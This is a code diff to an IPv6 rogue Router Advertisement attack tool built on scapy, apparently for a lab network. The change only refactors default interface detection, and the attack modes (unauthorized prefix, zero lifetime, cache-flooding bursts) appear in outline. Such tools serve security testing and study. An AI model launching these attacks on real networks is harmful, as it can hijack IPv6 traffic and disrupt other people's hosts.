@@ -8,6 +8,7 @@ Modes:
   3. burst        : Rapid burst of RAs to flood neighbor caches
 """
 
+import os
 import sys
 import time
 import argparse
@@ -15,8 +16,19 @@ import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import send, IPv6, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo
 
+def get_default_iface() -> str:
+    """Auto-detects the first non-loopback network interface in the current namespace."""
+    try:
+        ifaces = [i for i in os.listdir('/sys/class/net/') if i != 'lo']
+        if ifaces:
+            eths = [i for i in ifaces if 'eth' in i]
+            return eths[0] if eths else ifaces[0]
+    except Exception:
+        pass
+    return "eth0"
+
 def launch_rogue_ra(
-    iface: str = [i for i in __import__('os').listdir('/sys/class/net/') if i != 'lo'][0],
+    iface: str = None,
     mode: str = "unauthorized",
     count: int = 1,
     interval: float = 1.0,
@@ -24,6 +36,9 @@ def launch_rogue_ra(
     rogue_prefix: str = "2001:db8:dead::",
     prefix_len: int = 64
 ):
+    if iface is None:
+        iface = get_default_iface()
+
     print(f"[*] Launching Rogue RA Attack [Mode: {mode}] on interface {iface}...")
 
     if mode == "lifetime0":
@@ -57,8 +72,9 @@ def launch_rogue_ra(
     print("[+] Attack transmission completed.")
 
 if __name__ == "__main__":
+    default_iface = get_default_iface()
     parser = argparse.ArgumentParser(description="PS-007 Rogue Router Advertisement Attack Tool")
-    parser.add_argument("-i", "--iface", default="h2-eth0", help="Network interface to send on")
+    parser.add_argument("-i", "--iface", default=default_iface, help=f"Network interface to send on (default: {default_iface})")
     parser.add_argument("-m", "--mode", choices=["unauthorized", "lifetime0", "burst"], default="unauthorized", help="Attack variant")
     parser.add_argument("-c", "--count", type=int, default=3, help="Number of RA packets to send")
     parser.add_argument("--interval", type=float, default=1.0, help="Interval between packets in seconds")
